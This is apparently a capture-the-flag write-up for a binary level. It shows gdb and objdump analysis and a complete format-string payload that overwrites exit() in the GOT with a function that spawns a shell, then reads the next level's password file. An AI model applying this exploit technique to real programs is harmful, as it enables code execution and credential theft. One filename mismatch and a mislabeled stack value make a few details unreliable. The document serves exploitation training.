In this level, the executable waits for an input, prints it, and exits after pressing enter.

After analyzing it with gdb, we see that the main() function calls a function named `n()`, but there is also a non-called function `o()`. 

The `main()` function calls `n()`, which is not very interesting by itself. However, inside `n()`, there is a call to `fgets()`:
```
0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
```
This protects against buffer overflow attacks. After `fgets`(), there is a call to `printf()`:
```
0x080484f3 <+49>: call 0x8048380 <printf@plt>
```
This makes `printf()` vulnerable to a format string exploit.

The non-called function `o()` launches a shell via a call to `system()`:
```
0x080484b1 <+13>: call 0x80483b0 <system@plt>
```
We need to manipulate the `printf()` function into calling `o()` using a format string attack.

Our main concern is that both `n()` and `o()` never return and exit directly. Even if we overwrite something with the format string vulnerability, we may not be able to use that directly.

To overcome this, we can replace the address of `exit()` in the Global Offset Table (GOT) with the address of `o()`. Whenever `exit()` is called, the program will jump to the modified GOT entry.

First, find the address of `exit()` in the GOT and the address of `o()` function.
```
objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```
```
(gdb) info function o
All functions matching regular expression "o":

Non-debugging symbols:
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
0x080485a0  __do_global_ctors_aux
```

Now we have the address of `exit()`: `0x08049838` and the address of `o()`: `0x080484a4`.

We need to print the memory until we reach the address of `exit()`:
```
 python -c 'print "AAAA" + " %x" * 10' > /tmp/payload5
 cat /tmp/payload5 | ./level5
 AAAA 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
```
The address of `exit()` is at the 4th position (`41414141`).


Our final format string attack:
```
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
cat /tmp/exploit - | ./level5
cat /home/user/level6/.pass
```
